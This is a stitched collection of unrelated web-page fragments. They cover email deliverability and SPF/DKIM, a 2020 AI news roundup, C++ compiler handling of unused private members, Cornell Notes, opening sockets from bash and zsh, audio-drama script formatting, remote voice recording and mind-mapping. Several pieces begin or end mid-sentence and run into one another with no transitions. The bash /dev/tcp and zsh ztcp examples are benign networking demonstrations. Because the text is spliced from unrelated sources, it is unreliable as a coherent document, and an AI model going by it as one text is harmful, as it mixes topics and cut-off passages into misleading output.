<p><a href="https://www.swifterm.com/how-to-avoid-spam-filters/">Blacklists</a> are lists of sender domains (e.g. yourdomain.com) and servers or IP addresses that have been caught sending email spam.</p>
<p>Send an email from a blacklisted server or domain, and the chances are it will land in junk (or not at all).</p>
<p>There are<strong> over 100 blacklists for different purpose</strong>s, and you need to stay off of every single one of them.</p>

<h4><strong>What Gets You Blacklisted?</strong></h4>
<p>Falling foul of any of points 1-4 above.</p>
<p>The good news is that if you get blacklisted once, there’s a strong chance you will be able to <strong>de-list your site/server.</strong></p>
<p>Repeat offenders, though, will have more trouble getting off the blacklist. To avoid that, SwiftERM continuously monitors blacklists to keep users safe.</p>
<p>You can use <a href="https://mxtoolbox.com/blacklists.aspx">MX toolbox</a> to check if your server or domain is blacklisted.</p>

<p>As you’ve probably gathered by now,<strong> email deliverability is a complex topic</strong>. But it’s also an evolving one.</p>
<p>Spammers are always looking for new loopholes and tricks. New ways to abuse your email inbox.</p>
<p>On the flip side, mailbox providers like Gmail are catching up in keeping spam messages low, or out of sight altogether.</p>
<p>But now, let’s look at a tactic that has been used by spammers for years: <a href="https://www.malwarebytes.com/spoofing/">email sender spoofing</a>.</p>
<h4><strong>How Spammers Use Email Sender Spoofing</strong></h4>
<p>Sending an email on behalf of someone like <a href="https://www.swifterm.com/cdn-cgi/l/email-protection" data-cfemail="355854475e754c5a4047515a58545c5b1b565a58">[email&nbsp;protected]</a> is easy. Change a few header values, and the ISP will think that Mark is trying to send out a message.</p>
<p>With email spoofing, <strong>spammers can easily impersonate your brand’s email</strong> and send campaigns on your behalf. Right?</p>
<p>Well, fortunately, it’s not quite as simple as that. And <strong>mailbox providers are getting better at catching this type of spam.</strong></p>
<p>Most providers – certainly all major ones – will <strong>perform an ID check</strong> when receiving a new email.</p>
<h4><strong>Here’s How It Works</strong></h4>
<p>A mailbox provider receives an email from an address (say <a href="https://www.swifterm.com/cdn-cgi/l/email-protection" data-cfemail="0c616d7e674c7563797e6863616d6562226f6361">[email&nbsp;protected]</a>).</p>
<ul>
<li>The <strong>provider checks the IP address</strong> where the message originated.</li>
<li>Then, they <strong>check to see if that IP address has permission to send emails&nbsp;</strong>on behalf of yourdomain.com.</li>
</ul>
<p>This is called <strong>authentication</strong>. But let’s clarify something:</p>
<p><strong>Sending emails on behalf of another address is not necessarily a bad thing.</strong></p>
<p>Why?</p>
<p>Because this is precisely what all email service providers (ESPs) do to deliver the campaigns you design and send.</p>
<p>After all, you want to be sending emails from your <a href="https://get.store/blog/find-retail-business-domain-name/">branded domain</a>.</p>
<p>Setting up authentication in your email marketing service of choice is highly recommended. It will hint to Hotmail, Gmail, and all other providers that you have given consent to send emails on your behalf.</p>
<p>There are two main ways to set up email authentication: <strong>SPF and DKIM.</strong></p>
<p>Let’s take a look at them</p>
<p>SPF and DKIM are an item. In fact, they are complementary. What SPF lacks in ownership authentication, DKIM, makes up for it in email validation.</p>
<h3><strong>6. Use SPF To Verify Your Sender IP</strong></h3>
<p><em>Setting up your SPF records is essential.&nbsp;</em></p>
<p><a href="https://dmarcian.com/what-is-spf/">SPF (Sender Policy Framework)</a> is an email validation system designed to <strong>prevent spam by verifying the sender’s IP address.</strong></p>
<p>An SPF record allows web administrators to <strong>designate which web hosts are authorized</strong> to send messages from a given domain.</p>
<p>So how does this work?</p>
<p>When an SPF record is added to your website’s DNS, servers use it to <strong>verify that you are allowed to send emails from <a href="https://www.swifterm.com/cdn-cgi/l/email-protection" data-cfemail="d5acbaa0a7bbb4b8b095acbaa0a7b1bab8b4bcbbfbb6bab8fb">[email&nbsp;protected]</a></strong></p>
<p>Simply put, <strong>SPF says you are the owner of the domain </strong>and are allowed to contact people using this domain name.</p>
<h3><strong>7. Use DKIM to Verify Ownership of an Email Message</strong></h3>
<p><a href="https://blog.mailtrap.io/dkim/">DKIM (DomainKeys Identified Mail)</a> <strong>indicates ownership of the email message</strong> by a particular organization.</p>
<p>While the message is still in transit to the recipient, the organization’s<strong> signature </strong>is added to the email headers.</p>
<p>Most email clients will check for a valid DKIM signature on incoming emails to identify who sent it.</p>
<p>This means <strong>DKIM is a working way to prevent email deliverability issues and increase your sender reputation</strong> with email services.</p>
<p>The receiving mail server can identify the origin of the email marketing campaign.</p>
<h4><strong>Should You Use SPF or DKM?</strong></h4>
<p>Quick answer: <strong>You should use both.</strong></p>
<p>Unless you are an email marketing nerd, you probably don’t need to know precisely how SPF and DKIM work.</p>
<p>But what you do need to know is that both authentication levers are required to <strong>reduce spam and improve email deliverability rates</strong>.</p>
<p>SPF and DKIM work together.</p>
<p>For instance, DKIM alone does not guarantee that the sender’s server is permitted to send outgoing emails in the name of your website (your domain).</p>
<p>Often, SPF on its own is powerless as many website owners research&nbsp;different web …</p></div></div>

Founded on the brains of tiny animals like threadworms, this new-age AI-system can control a vehicle with a few artificial neurons.</p><p> The solution offers remarkable benefits over previous Deep Learning models. Away from the infamous “black box”, it can handle noisy inputs and is simple to understand. The model was published in Nature Machine Intelligence.</p><h5>MIScnn was released</h5><p> MIScnn, an open-source Python framework for medical image segmentation with convolutional neural networks and Deep Learning, was announced.</p><p>It has intuitive APIs enabling the fast setup of medical image segmentation pipelines in just a few code lines. MIScnn also has data I/O, preprocessing; patch-wise analysis; data augmentation; metrics; a library with state-of-the-art deep learning models and model utilization; and automatic evaluation.</p><h5>TensorFlow 2.3 was released</h5><p>The new version comes with easy loading, faster preprocessing of data, and easier solving of input-pipeline bottlenecks. tf.data solves input pipeline bottlenecks and improves resource utilization. For advanced users, it has improved training speed. tf.data allows users to reuse the output on a different training run, which frees up additional CPU time.</p><p> The TF Profiler adds a memory profiler to visualize the model’s memory usage, and a Python tracer to trace Python function calls in the model. It also offers experimental support for the new Keras Preprocessing Layers API.</p><h5>PyTorch 1.7.0 was released</h5><p> It includes many new APIs including “support for NumPy-compatible FFT operations, profiling tools, and major updates to both distributed data parallel (DDP) and remote procedure call (RPC)-based distributed training.”</p><h5>November and Beyond</h5><p>As 2020 enters its last lap, we expect more new and impressive developments to crop up.</p><p>Mark Cuban said: “Artificial Intelligence, deep learning, machine learning — whatever you're doing if you don't understand it — learn it. Because otherwise you're going to be a dinosaur within 3 years.”</p><p>Cheers to diving deeper into Deep Learning!</p><p> Did we miss an important update? Share with us!</p>

December 3, 2020 | https://quuxplusone.github.io/blog/2020/12/02/unused-private-member/ | <a href="https://web.archive.org/web/*/https://quuxplusone.github.io/blog/2020/12/02/unused-private-member/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>The other day, I was asked whether we should worry about the space
taken up by unused functions in our codebase. My answer followed this rambling path:</p>

<ul>
  <li>
    <p>Unused function templates won’t even get instantiated, so they
  really have no existence at link-time.</p>
  </li>
  <li>
    <p>Unused inline functions <em>may</em> be codegenned, but if you have compiler
  optimizations turned on, you probably won’t see any codegen for
  inline functions unless they are actually called.</p>
  </li>
  <li>
    <p>Unused static non-member functions, logically, should be codegenned,
  but since static functions aren’t visible beyond their own
  <a href="https://quuxplusone.github.io/blog/2019/08/02/the-tough-guide-to-cpp-acronyms/#tu">TU</a>,
  the compiler may be able to detect and warn about them — and
  with compiler optimizations turned on, the compiler may decide
  that there’s no reason to generate code for them either.</p>
  </li>
  <li>
    <p>Unused non-static (external-linkage) functions, though, <em>must</em> be codegenned,
  because the compiler cannot prove that no other TU calls them.
  An optimizing <em>linker</em> might be able to prove that nobody needs
  those definitions, and eliminate them — I personally have worked
  on a linker that did exactly that optimization — but in general
  your mental model of a linker should be that it won’t do that
  optimization.</p>
  </li>
</ul>

<blockquote>
  <p>The linker is likely able to prove that the function is unused;
but without some degree of help from the compiler, it probably won’t
be able to prove that it is safe to just snip that function’s bytes
out of the text section. That might mess up some relative offset that
the rest of the object file is secretly relying on.</p>
</blockquote>

<p>“What if they’re marked private?”</p>

<ul>
  <li>
    <p>Unused private (non-static) data members, logically, must take up space
  in the memory footprint of the class, so that every TU will agree on
  the <code>sizeof</code> the class. However, <em>if</em> in some specific TU the compiler
  can see the complete definition of every member and every friend of
  the class, then it can prove that the private member really is
  unused, and then it can give a warning. Clang does this.</p>
  </li>
  <li>
    <p>Hmm, but Clang does this <em>only</em> for private data members, not for
  private member functions! That’s interesting!</p>
  </li>
</ul>

<p>Here’s the complete list of non-temploid non-inline entities you might
encounter, and what the major compilers do with them if they’re provably
unused. (<a href="https://godbolt.org/z/cMWPE1">Godbolt.</a>)</p>

<p>Options-wise, I tested <code>-W1 -W2 -W3 -W4 -Od -O1 -O2</code> on MSVC,
and <code>-Wall -Wextra -O0 -O1 -O2 -O3</code> on the other three.</p>

<p>I claim that there’s a fair bit of room for improvement here!</p>

<p>Or am I missing some subtle mechanism by which “unused” private members
might actually be referenced from other TUs?</p>

<p>UPDATE: Yes, I am! See my followup:</p>

<ul>
  <li><a href="https://quuxplusone.github.io/blog/2020/12/03/steal-a-private-member">“How to use a private member from outside the class”</a></li>
</ul>

<p>I have placed “–” in table cells where this loophole makes the suggested optimization
technically impossible for a conforming compiler. All compilers’ diagnostics could
use improvement, but the new optimization table shows that everyone (except MSVC)
is doing the best they can, optimization-wise.</p>

possible. The beauty of Cornell Notes lies in the layout, and by employing this technique you will find yourself making more sense of the class material as the lesson progresses, and a better understanding of the content when it’s time for review.</p><h2>Advantages and Use Cases of Cornell Notes</h2><div><div><h3>It’s simple</h3><p>This is Cornell Notes’s most prominent feature, and its biggest advantage too: it’s simple. It’s such a straightforward method to implement that you don’t need much to do it. No coloured tabs or reams of dividers or post-it notes, just pen and paper. It also means that once you’ve read this article you’ll be good to go, and bringing big gains to your note-taking skills in no time.</p></div><div><h3>It’s flexible</h3><p>There are an abundance of subject-matters out there - luckily, Cornell Notes work with every single one. They can be applied to any number of scenarios, including those outside of the learning environment. Whilst the majority of people will use Cornell Notes within the context of classroom learning and university lectures, it works equally well with online courses, client meetings, and even business planning.</p></div><div><h3>You will retain information better</h3><p>Cornell Notes break lessons down into manageable chunks that are easy to remember. In this way you can keep track of the salient bits of information that also come to be better understood on later review. Additionally, the Cornell layout is designed for easy testing of the information on the page which will further improve study-productivity.</p></div></div><h2>How to take Cornell notes?</h2><p>To begin with, divide your paper into a few sections, essentially an off-centre “I” like the following:</p><p>To save time, it can be good to come to class or your meeting with a bunch of sheets that already have the layout. The basis of the Cornell Notes format involves separating the page into four sections: a space at the top for some specific topic details, a right hand column containing the main pieces of content we need to know (also known as the “Response Column”), with a column on the left called the “Cue Column”, containing keywords and questions. Finally the bottom space is a summary of the information above it.</p><h3>1. Top Space - Subject Particulars</h3><p>The first thing you will want to do is fill in some details like the specific topic that these notes are on, and the topic/objective to be covered. This top space will contain information that will organise your notes later, so noting the date, lecture number and so on could prove useful later.</p><h3>2. Right Hand Column - Main Notes</h3><p>The large box on the right hand side is for noting down key words, concepts and facts. As you listen to the information you’re learning, note down the salient points in this column. Make sure you skip lines between ideas so there’s a clear separation between them on the page (and in your mind when you go back to revise). If you find an online lecture going too quickly, also think about skipping a couple of lines to leave yourself some space in case you need to go back and add things later.</p><h3>3. Left Hand Column - Cues</h3><p>So far, this all seems pretty similar to regular note-taking. However, it’s when we get to the left column the magic really happens. We now want to cue on the left things that relate to the information we've just written down. The cue can be a question, keyword or phrase that refers to the material on the right hand side. In some cases the lesson might move on before we have time to fill it in and that's fine. Just come back later and write the cues when there's a pause in the session.</p><p>Once this section is filled in, you will be left with two columns consisting of cues and responses, with those cues on the left encouraging us to think of the more detailed information on the right.</p><h3>4. Bottom Space: Summary</h3><p>The final section to fill is the bottom space. This is your summary, essentially a few sentences outlining the key points of the information above. Pull out key ideas from the cue and response columns, maybe any vocabulary you're unfamiliar with, and just generally all the important stuff that you’d want to know if you were going to explain this topic to somebody else.</p><p>It can be good to wait at least a couple of hours before doing the summary, so as to give time for the content to sink in and let your brain sort things out in the background.</p><h2>Subsequent Testing and Review</h2><p>And that’s it! The last step of the Cornell Notes process is when you come back to the notes for review and revision. You’ll see a clearly structured representation of the class and subject-area, and have a ready-made testing system in front of you: cover the right hand column and you’ll have questions or keyword prompts to answer and expand upon for a really productive revision session.</p><h2>Conclusion</h2><p>It almost sounds too simplistic to be effective, but it is in its simplicity that Cornell Notes work so well. This is a technique that not only helps you consolidate details of information better, but remember it too. Whilst Cornell Notes help you with taking notes in the moment, they help you when coming to revise those notes later, enhancing your study-time and improving your productivity.</p></article></div>]]>

<p>Something I learned recently and I thought was <em>amazing</em> - you can create sockets straight from your shell! Well, assuming you use bash or zsh - from some surface level digging, I couldnâ€™t find anything for fish.</p>

<p>Hereâ€™s how it works:</p>

<h2 id="bash">bash</h2>
<p>Bash supports tcp and udp connections out of the box, and does so with an imaginary device in <code>/dev</code>. Enter</p>
<div><div><pre><code><span>$ </span><span>echo</span> <span>"text!"</span> <span>&gt;</span> /dev/<span>$PROTO</span>/<span>$HOST</span>/<span>$PORT</span>
</code></pre></div></div>
<p>And youâ€™ll create a connection to <code>HOST:PORT</code>. <code>$PROTO</code> can be <code>tcp</code> or <code>udp</code>. If the connection canâ€™t be made, writing to/reading the file will fail.</p>

<p>Along with being easy to access from the terminal, itâ€™s <em>very</em> handy for scripts, especially if you donâ€™t have <code>nc</code>/<code>telnet</code>. For example, if a local build of a web app runs on port 8000, you can check if itâ€™s running with:<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<div><div><pre><code><span>#!/bin/bash</span>
<span>if </span><span>exec </span>3&gt;/dev/tcp/localhost/8000 <span>;</span> <span>then
	</span><span>echo</span> <span>"server up!"</span>
<span>else
	</span><span>echo</span> <span>"server down."</span>
<span>fi</span>
</code></pre></div></div>
<p>And then use that information somewhere else.</p>

<p>If youâ€™re unfamiliar, <code>exec</code> without any arguments is used to redirect file descriptors and files. By associating fd 3 with <code>/dev/tcp/localhost/4000</code>, it attempts to create a file there and thus a connection. We use <code>&gt;</code> to open the socket for writing, although we donâ€™t need to write anything in this case.</p>

<p>By using <code>&lt;&gt;</code> we can open a file for reading and writing, and use it to create a super simple curl:</p>
<div><div><pre><code><span>#!/bin/bash</span>
<span>exec </span>3&lt;<span>&gt;</span>/dev/tcp/<span>"</span><span>$1</span><span>"</span>/80
<span>echo</span> <span>-e</span> <span>"GET / HTTP/1.1</span><span>\n</span><span>"</span> <span>&gt;</span>&amp;3
<span>cat</span> &lt;&amp;3
</code></pre></div></div>
<div><div><pre><code>$ ./simplecurl www.google.com

<p>Iâ€™m sure you can see the power of being able to open sockets with bash alone. Go play around with it!</p>

<h2 id="zsh">zsh</h2>
<p>zsh has an external module you can load in order to use itâ€™s socket capabilities. It doesnâ€™t support udp like bash, but itâ€™s more powerful in a few ways!</p>

<p>To load the module, put the following in your <code>.zshrc</code> or run it in your shell:</p>


<p>We now have access to the zsh networking builtin - <code>ztcp</code>!</p>

<p><code>ztcp</code> allows creating connections, like bash, but also allows listening for connections.</p>

<p>Straight from the zsh docs, we can create a connection between two machines with <code>ztcp</code>:</p>

<div><div><pre><code><span># host machine:</span>
ztcp <span>-l</span> 7128
<span>lfd</span><span>=</span><span>$REPLY</span>
ztcp <span>-a</span> <span>$lfd</span>
<span>talkfd</span><span>=</span><span>$REPLY</span>

<span># client machine</span>
ztcp HOST 7128
<span>talkfd</span><span>=</span><span>$REPLY</span>
</code></pre></div></div>

<p>The <code>$REPLY</code> variable here is a file descriptor returned by the last <code>ztcp</code> command, referring to the socket/connection it just created.</p>

<p>So, <code>talkfd</code> on both machines is a file descriptor for talking to the other:</p>
<div><div><pre><code><span># host machine</span>
<span>echo</span> <span>-e</span> <span>"hello!"</span> <span>&gt;</span>&amp;<span>$talkfd</span>

<span># client machine</span>
<span>read</span> <span>-r</span> line &lt;&amp;<span>$talkfd</span><span>;</span> print <span>-r</span> - <span>$line</span>
<span>&gt;</span> hello!
</code></pre></div></div>

<p>Again, thereâ€™s a lot more you can do, especially with the ability to listen for connections.</p>

<p>Hope this was as interesting to you as it was to me!</p>

Lines aren’t learned so it is vital that everyone is working from the same script, formatted in the same way. Believe me, a well formatted script can be worth it’s weight in gold. The easiest way for me to summarise why, is using the following breakdown.</p><h2>Best way to format an audio drama script</h2><div><p><strong>1 – Number the pages</strong>.</p><p><em>Sounds obvious I know, but you’d be amazed how many scripts we receive with no page numbers. Opinions differ on the best way to do this, but not long ago I found myself being playfully yelled at by the wonderfully eccentric actress&nbsp;<a href="https://en.wikipedia.org/wiki/Miriam_Margolyes" target="_blank" rel="noopener">Miriam Margolyes</a>. Her words echoed in my ears; “Who the hell do I have to f*ck to get the page numbers in the TOP RIGHT HAND CORNER OF THE PAGE?!!”. I sheepishly answered, “that would be me” and she went on to explain how much easier it is for actors to have it that way. I had always put the page numbers in the bottom right, but have since seen many actors clearly mark the page numbers in pen on the top right hand corner, leading me to believe that Ms. Margolyes is obviously correct and it makes those dreaded page turns considerably easier.</em></p></div><div><p><strong>2 – Number the lines.</strong></p><p><em>This is the killer. A good audio drama script needs to have each new cue numbered, starting&nbsp;from 1 on each new page. This is by far the most laborious part of the job (especially when you’re formatting a script which is 300+ pages). There is no programme which will do it for you – believe me, I have looked. Your best hope is that Word will recognise the pattern and make it a little easier as you go. It takes ages – but it’s very important for the entire process. In the studio it helps the director communicate with the actors “That was great, can we just redo lines 3 – 7 on page 444?”, meaning that people aren’t faffing around trying to find actual lines when you have precious little time in your £££-per-hour-studio. It also helps immeasurably with scheduling and editing.</em></p></div><div><p><strong>3 -Don’t split speeches over two pages</strong>.&nbsp;</p><p><em>To avoid the dreaded page turns during a take (or a pause as the ipad flicks up) don’t allow a speech to be split over a page. It’s best to have it all on one page, even if it means you leave a gap on the page before. This also helps the actor – no one wants to pause in the middle of a great speech to have to quietly turn a page. It kills the moment.</em></p></div><p><strong>4 – New scene, new page</strong>.&nbsp;</p><p><em>Yup, it makes the script longer and wastes paper, but it’s vital that new scenes start on a new page. It’s easier that way for all involved – for example, if you’re recording a very long (heavy) script, actors can just bring in their scenes easily without having half the scene before and after with them as well.</em></p><p><strong>5 – Mark SFX and Music cues clearly.</strong>&nbsp;</p><p><em>Sound effects cues don’t need to be numbered but they do need to be clearly marked so that the sound designer can skim through and locate their cues easily.</em></p><p><strong>6 – Differentiate&nbsp;narrator text.</strong>&nbsp;</p><p><em>Usually in bold, or italics. This means it’s easy to find if you record narration separately.</em></p><p><strong>7 – Use a clear, reasonably sized font</strong>.<em>&nbsp;</em></p><p><em>I prefer Arial, 12pt – but anything clear will do.&nbsp;</em></p><p><strong>8 -Descriptions or no description?</strong>&nbsp;</p><p><em>Recently, after sending out the below sample of audio formatting to a writer, he emailed back wondering; why, in audio drama, it is relevant to state ‘day’ or ‘night’? Of course, a writer doesn’t&nbsp;<strong>have</strong>&nbsp;to specify these things, but they shouldn’t be put off doing so simply because it’s audio drama. The world being created is as 3D and immersive as any other medium and the cast and crew need to be able to feel this.&nbsp;These aren’t just words on a page. In the below example, the scene is an&nbsp;amateur dramatics rehearsal of Romeo &amp; Juliet. The writer has specified it’s night time – but they’re inside and, with no visuals, is this necessary? Yes, it’s useful for the actors to help create their characters. Most of the characters have probably come to rehearse after work and aren’t getting paid, maybe they’re tired, maybe they’re hungry… I’d argue that well placed hints about the actors surroundings and environment are a huge help. Not to be mistaken, however, for lengthy descriptions of visual set design clearly left over from a lazily ‘adapted’ stage script.</em></p><p><strong>9 – List of characters</strong>.&nbsp;</p><p><em>This is something that I just prefer as it’s a huge help when casting if characters are listed, and even better with a short description including age. It’s a really handy reference.</em></p><div><figure><a href="http://blog.wirelesstheatre.co.uk/wp-content/uploads/2017/04/script-e1492597978203.jpg" target="_blank" rel="noopener"><img loading="lazy" width="266" height="270" src="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/script-e1492597978203.jpg" alt="How to Format an Audio Drama Script - Wireless Theatre"></a></figure></div><p>Below is a sample of audio drama script formatting. This is by no means gospel and many other companies may do it differently, and everyone must find what works for them. This is how we do it based on our experience of producing audio theatre and also of what seems to be most helpful to the actors and crew we work with.</p><h3><a href="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/WTL_Sample_Script2017.pdf">Wireless Theatre Sample Audio Script</a></h3><p>Writing an audio drama script is the start of a hugely exciting production process and over the last three years I have seen the online audio drama community grow and grow. It’s inspiring and&nbsp;thrilling to watch it develop and if this article in any way helps someone wanting to get into writing audio drama, then that is a gooooood thing.</p><p><strong>Mariele Runacre-Temple</strong>&nbsp;–&nbsp;<em>Producer, Audio Drama</em></p></div></div>]]>

It was early March 2020 and I had made a trip to London to get a guided tour of where I’d be working that summer: In a studio that was built for purpose – recording voices!</p></div><div><figure><img loading="lazy" width="400" height="532" src="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/Tshari-portrait.jpg" alt="Tshari King Sound Engineer Wireless Theatre Ltd" srcset="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/Tshari-portrait.jpg 400w, https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/Tshari-portrait-226x300.jpg 226w" sizes="(max-width: 400px) 100vw, 400px"><figcaption>Tshari King Sound Engineer</figcaption></figure></div><p>The Wireless Theatre Company&nbsp;has recorded many productions in very lovely professional studios but my own experience came from the company’s&nbsp;<a href="https://www.wirelesstheatrecompany.co.uk/recorded-live">live shows</a>. In the 10 or so years that I’ve worked with WTC, I’ve recorded audio dramas in theatres, large and small; conference rooms; huge live rooms designed for recording rock bands and ‘found spaces’ with ‘unique’ acoustics. It’s been a heady combination of fantastic fun and loads of hard work wedged into never-enough-hours. Over years of practice in many different venues, we’ve honed our skills and fine-tuned our productions into well-oiled machines. So perhaps I wasn’t destined to work in the cushy, temperature-controlled environment of the professional voice studio: Lockdown came into effect pretty much the day that I got home from London, the events industry suffered considerably from the outset, and, for a little while, all hope seemed lost. Then I got an email:&nbsp;<em>“We’re looking into the feasibility of recording remotely, do you think you’d be interested?”</em></p><div><p><strong>TAKING TEA IN THE SAME PARLOUR</strong></p><p>I was booked to record and edit the dialogue for a production which had been chosen for its good chances of remote recording success (no gigantic, space laser shooting, dragon fighting battles in mythical lands). The play is a period piece set in England, predominantly in the quiet of the countryside. The main obstacle I had to overcome was to take a group of actors who were spread out all over the country and get them to sound like they were all taking tea in the same parlour.</p><p><strong>RECORDING 101</strong></p></div><p>A professional recording studio should provide three things essential to making a quality recording:.<br></p><div><p>1.&nbsp; An acoustically-treated space,<br>2.&nbsp; High quality, professional equipment, and<br>3.&nbsp; Someone experienced in capturing the performance ‘magic’ at the highest quality possible.</p><p>In this instance I needed a cast of 19 actors to do all the work – the ‘studio’ was now in the homes of people who had spent their careers honing their acting skills, trusting the technical side to someone like me.&nbsp;My first task was to figure out how to get the best recordings out of everyone without being there myself. I wanted the process to be friendly, enjoyable and comfortable – acting is hard enough without having to divide your focus with processes that you don’t normally have to think about. While there is software that allows multiple people to record simultaneously via the internet, initial tests didn’t work out as stress-free as I’d hoped: there were barriers to getting the results needed, namely internet drop outs and issues with needing to connect so many people at the same time.&nbsp;.After further tests, my solution was to have everyone record themselves onto their own computer while using software designed for recording over the internet as a “virtual” studio where everyone could hear each other. I would record a “guide track” using a feed from the same software which would enable me to sync up everyone’s individual recordings once they’d sent them over to me at the end of the day. Easy!</p></div><p><strong>7 WARDROBES, SOME CUBBY HOLES AND A SHED</strong></p><p>Even after settling on how to record, I was worried that it would be a huge learning curve for everyone to essentially become a studio designer and recording engineer while delivering&nbsp;a convincing performance as an actor at the same time. As soon as casting was confirmed I sent an email to each cast member asking how they felt about using computers, whether they had recorded from home before, what their equipment was, and most importantly, asking for a sample recording.&nbsp;.</p><div><figure><a href="http://blog.wirelesstheatre.co.uk/wp-content/uploads/2020/09/Screen-Shot-2020-09-24-at-19.23.46.png" target="_blank" rel="noopener"><img src="https://blog.wirelesstheatre.co.uk/wp-content/uploads/2020/09/Screen-Shot-2020-09-24-at-19.23.46-300x175.png" alt="Remote Recording"></a><figcaption>Recording in Lockdown</figcaption></figure></div><div><p>I asked&nbsp;everyone to record the same piece of text, moving slightly further from their microphone with each verse. This allowed me to really hear the space they were in and see if it would work. When I had everyone’s recordings together in the same software, I could listen to each to try and match them up acoustically.&nbsp;.I was super impressed with the lengths that everyone had already gone in finding/creating a usable recording space. The wardrobe was the most popular (being the space with the highest density of fabric – highly important for making recordings with minimal sound reflections/echo) but we had some other interesting household locations such as; under the stairs, a cubby hole in the attic, a “den” made out of vintage bedding, a newly built homemade vocal booth in the corner of a room and, my personal favourite, a small shed built in the alcove of a large bedroom and “treated” inside and out with various soft furnishings.&nbsp;</p><p><strong>TRY TURNING IT OFF AND ON AGAIN</strong></p><p>Us humans have a tendency to find fear or anxiety in the unknown and working with unfamiliar technology is no exception:&nbsp;<em>“What happens if I press this button?”, “Is it supposed to do that?”.</em>&nbsp;As a ‘techie’, years of practice and learning that sometimes it’s okay to have leftover screws at the end of repair projects have given me the confidence to just press buttons and see what happens, smack things to make them work and boldly go beyond the warranty seal..Most of the cast had not had that experience and were wary of their newly- acquired audio responsibilities. I did whatever I could to ensure everyone was comfortable using the various equipment they had – I learnt my way around 2 new DAWs (Digital Audio Workstation, or computer recording software), refreshed my memory on 2 more, wrote 4 tutorials and had many hours of phone and video chats, plus loads of emails. Finally, we were ready to record!.</p><p><strong>GETTING IT RIGHT AT THE SOURCE</strong></p><p>We were lucky enough to be able to schedule in more days to record than we would have had in the studio and we needed them! It took me all of day one to figure out how to streamline the recording process (if there’s a better way to do this than by trial and error, please let me know) but from day two we were speeding along. Our director had thought of everything and managed it accordingly; the number of actors we could connect at any one time and keep the internet stable; upload breaks for sending files over to me so that it wouldn’t be a huge job at the end of the day; breaking up the script to keep things in the best order for recording.&nbsp;.</p></div><div><figure><img loading="lazy" width="400" height="406" src="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/making-a-podcast.jpg" alt="Mariele Runacre Temple Corona Cartoons Wireless Theatre Ltd" srcset="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/making-a-podcast.jpg 400w, https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/making-a-podcast-296x300.jpg 296w" sizes="(max-width: 400px) 100vw, 400px"><figcaption>from ‘Corona Cartoons’ by Mariele Runacre Temple</figcaption></figure></div><p>In a studio recording, the engineer would typically stop recording between takes but, as the cast were recording themselves, I didn’t want the recording process to get in the way of performance, so I opted for just pressing record at the beginning of each scene and letting it roll, getting them to make a “snap” sound at the start of each recording which I would use to sync up the multiple recordings later. We co-ordinated record and stops together and soon everyone was bored of hearing me say “<em>we will record in…3,2,1, Recor</em>d”, my new catchphrase “stop and save!” with some added, “don’t forget to save!” thrown in at random intervals. From then on, all we had to contend with were internet dropouts, passing aircraft (civilian and military), lawnmowers, neighbours (hammering and shouting), occasional traffic, seagulls and pigeons; hardly perfect ambience for a period piece!&nbsp;<br></p><div><p>Once recording was finished for the day, I consolidated everyone’s individual audio recordings into something resembling what you would get from a regular studio recording. This meant syncing up everyone’s files in my software, checking that it had recorded properly at their end and placing markers for each scene and take. It took a couple of hours each evening, but saved me many hours when it came to the edit.&nbsp;.The editing process itself went pretty smoothly. After the edit, the audio is sent to the Sound Designer who breathes life into the production and it needs to sound it’s best before handing it over. I had to spend extra time compensating for the now very apparent lag caused by the internet connections: I trimmed gaps between almost every single line and removed any little noises that we missed during the recording sessions, from the tell- tale creak of someone shifting in their seat to distant traffic noise.</p><p><strong>THAT’S A WRAP</strong></p><p>Teams up and down the country and across the globe have had to find new ways of doing what they do (in our case,&nbsp;<a href="https://www.wirelesstheatrecompany.co.uk/home">create excellent audio</a>) in exceptional circumstances. The longer this goes on, the more it feels like these exceptional circumstances may become the norm, and I feel very honoured to be among the engineers who have ventured into this new way of working. Not to make it sound like I boldly strode in and ‘saved the day’ on this production; it was all very much a team effort and a learning curve for all of us. None of this would have happened without the tireless work of the amazing director and the WTC team. Ask us to do another one and we’ll be better and faster; another 5 and we’ll do better than a studio production!</p></div></div></div>]]>

Left side is responsible for logical reasoning and storing the information (text and keywords) and the right side is responsible for creativity and visual interpretations (coloring and visual positioning of the elements). Both things enhance our ability to remember things. Thus, a mind map is a must-use tool for everyone who wants to learn, or remember concepts easily.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/870/0*7xDdURIPArx_xeWr" width="435" height="435" srcset="https://miro.medium.com/max/552/0*7xDdURIPArx_xeWr 276w, https://miro.medium.com/max/870/0*7xDdURIPArx_xeWr 435w" sizes="435px" data-old-src="https://miro.medium.com/max/60/0*7xDdURIPArx_xeWr?q=20"></p></div></div></figure><p id="ef1d">I’m currently using Miro for that, but there are a few things I don’t like about it.</p><p id="a698">So creating a mindmap of a book or some concepts that it presents is a great way to actively work and interpret the information. I will be creating mindmaps for all kinds of concepts, including Effective Learning, Productivity, Love, Business, and more.</p><p id="0e87">Here’s an example of a <a href="https://miro.com/app/board/o9J_kg2KwH4=/" rel="noopener">mind map that I created for this topic</a></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*N7AwAdT3-ppgpXGo" width="1600" height="1061" srcset="https://miro.medium.com/max/552/0*N7AwAdT3-ppgpXGo 276w, https://miro.medium.com/max/1104/0*N7AwAdT3-ppgpXGo 552w, https://miro.medium.com/max/1280/0*N7AwAdT3-ppgpXGo 640w, https://miro.medium.com/max/1400/0*N7AwAdT3-ppgpXGo 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*N7AwAdT3-ppgpXGo?q=20"></p></div></div></div></figure><p id="18b7">We learn best when we are tested. Since many of us have already graduated from schools and universities, there’s no one to test us. So, we have to test ourselves.</p><p id="e452"><strong>Create a summary of each chapter</strong></p><p id="8cc8">To move the knowledge from short term memory into a long term understanding we should create concepts in our brain and try to interpret them. The best way to 